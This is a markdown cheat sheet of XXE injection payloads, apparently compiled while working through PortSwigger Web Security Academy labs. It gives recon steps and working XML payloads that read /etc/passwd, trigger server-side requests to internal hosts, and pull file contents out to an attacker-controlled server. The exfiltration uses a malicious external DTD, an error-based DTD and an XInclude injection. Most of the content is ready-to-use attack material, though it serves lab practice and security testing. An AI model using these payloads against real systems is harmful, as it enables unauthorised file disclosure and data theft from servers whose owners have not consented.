# XXE Injection

## Summary

* [Recon for XXE](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

<br>

## Resources

* https://portswigger.net/web-security/xxe

* https://www.youtube.com/watch?v=gjm6VHZa_8s

* https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html 

* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection 

<br>

## Recon

### How to find and test for XXE vulnerabilities

* https://www.bugcrowd.com/blog/how-to-find-xxe-bugs/ 


* Manually testing for XXE vulnerabilities generally involves:

    * Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.


    * Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator client is perfect for this purpose.


    * Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.


    * If the application is allowing to upload files with a svg, xml, xlsx extension or any other file formats that either use or contain XML subcomponents, try injecting an appropriate XXE payload. 


    * Modify the content type of the requests to XML type and see if the application still processes the modified data correctly.  If it does try injecting a XXE payload.


* https://portswigger.net/web-security/xxe#how-to-find-and-test-for-xxe-vulnerabilities

<br>

---

<br>

## Cheat Sheet


**If the application <u>is returning</u> the values of the defined external entities in its response, we can try the following techniques:**

<br>

### File Retrieval

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* We may be able to see the contents of the /etc/passwd file in the response.

<br>

### In-band SSRF

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* We may be able to see the HTTP response returned from the internal website.


<br><br>

### Example:  XXE Injection Attack

* The XML value in \<productId\> is being reflected in the response when an error is triggered so this was a good target for in-band XXE injection.

* The below is an example payload for XXE injection:



![XXE Injection](https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/XXE%20Injection/Images/XXE-1.png)



<br><br><br>

**If the application <u>is not returning</u> the values of the defined external entities in its response, we need to use Blind Payload Techniques:**



### Blind XXE to a server you control

* Inject the following payload in the body of the request on the target application:


```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://server-you-control.com"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* Check your server logs for any network traffic.


<br>

### Blind XXE to a server you control, when regular external entities are blocked (use parameter entities):

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://server-you-control.com"> %xxe; ]>
```

* Here the xxe parameter entity needs to be referenced “within” the DOCTYPE.

* Check your server logs for any network traffic.


<br><br>

### Example:  XXE Injection Parameter Entities

![XXE Injection2](https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/XXE%20Injection/Images/XXE-2.png)


<br><br>

### Blind XXE to exfiltrate data – malicious external DTD

* Host the following code in a .dtd file on your server:  (Change the targeted file as needed.)

* This will cause the application to issue a request to the attacker's server, appending the contents of the /etc/passwd file as a query parameter.


```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://server-you-control.com/?x=%file;'>">
%eval;
%exfiltrate;
```

* Now inject the following payload in the body of the request on the target application:  (Note: The file on your server needs to be called "malicious.dtd")

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://server-you-control.com/malicious.dtd"> %xxe;]>
```


<br>

### Blind XXE to exfiltrate data – external DTD via error messages

* Host the following code in a .dtd file on your server, the “nonexistent” file will cause an error message, and the stack trace will include the contents of the /etc/passwd in the HTTP response of the target application:


```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

* Inject the following payload in the body of the request on the target application: (Note: The file on your server needs to be called "malicious.dtd")

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```


<br>

### Blind XXE – repurpose a local DTD

* https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd

<br>

### Hidden Attack Surface – XInclude Attacks

* Inject the following payload in the body of the request on the target application: 

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

* Payload Example: (URL encoding is required on appropriate characters to work properly in POST request.)

```
productId=1<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```

<br>

### Hidden Attack Surface – File Upload

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files

* https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

* To identify this vulnerability:

   * Set the file extension to .svg
 
   * Include a \<svg\> parameter in the request body where the file's contents go 

<br>

### Change Content Type of Request

* Change the content type and body of the request to XML type and analyze if the application still processes the request correctly.  If it does, then we can try XXE payloads.

    * Example:  foo=bar

```xml
<?xml version="1.0" encoding="UTF-8"?>
<foo>bar</foo>
```

<br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet.
